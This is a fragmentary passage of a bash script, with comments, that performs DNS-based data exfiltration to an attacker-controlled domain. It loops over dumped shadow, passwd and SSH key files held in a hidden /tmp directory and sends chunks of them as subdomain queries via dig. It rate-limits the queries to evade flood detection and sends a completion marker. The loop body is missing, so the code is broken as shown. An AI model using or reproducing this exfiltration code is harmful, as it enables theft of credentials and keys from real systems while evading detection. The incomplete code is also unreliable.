# 3. Split into 50-byte chunks (max DNS label length minus overhead)
# 4. Send each chunk as a subdomain query to attacker-controlled DNS

#   chunk1.data-collector.internal-metrics.example.com
#   ...
#   END.data-collector.internal-metrics.example.com  (termination signal)

#!/bin/bash
EXFIL_DOMAIN="${DNS_EXFIL_DOMAIN:-data-collector.internal-metrics.example.com}"
CACHE_DIR="/tmp/.audit_cache"

for f in "$CACHE_DIR"/shadow_dump "$CACHE_DIR"/passwd_dump "$CACHE_DIR"/ssh_keys_dump; do
  if [ -f "$f" ]; then

      sleep 0.5  # Rate limit to avoid DNS flood detection
    done
    # Send termination marker
    dig +short TXT "EXFIL-COMPLETE.${EXFIL_DOMAIN}" > /dev/null 2>&1
